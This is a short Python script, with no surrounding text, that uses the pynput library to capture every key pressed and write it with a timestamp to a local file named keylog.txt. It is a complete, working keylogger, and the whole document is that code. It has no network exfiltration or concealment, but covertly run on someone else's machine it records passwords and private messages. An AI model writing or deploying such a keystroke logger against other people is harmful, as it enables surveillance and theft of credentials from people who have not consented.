from pynput.keyboard import Listener
import logging

# Configure logging to store keystrokes in a file
logging.basicConfig(filename="keylog.txt", level=logging.DEBUG, format="%(asctime)s: %(message)s")

def on_press(key):
    try:
        # Log each key pressed
        logging.info(str(key))
    except Exception as e:
        print(f"Error: {e}")

# Start the listener
with Listener(on_press=on_press) as listener:
    listener.join()
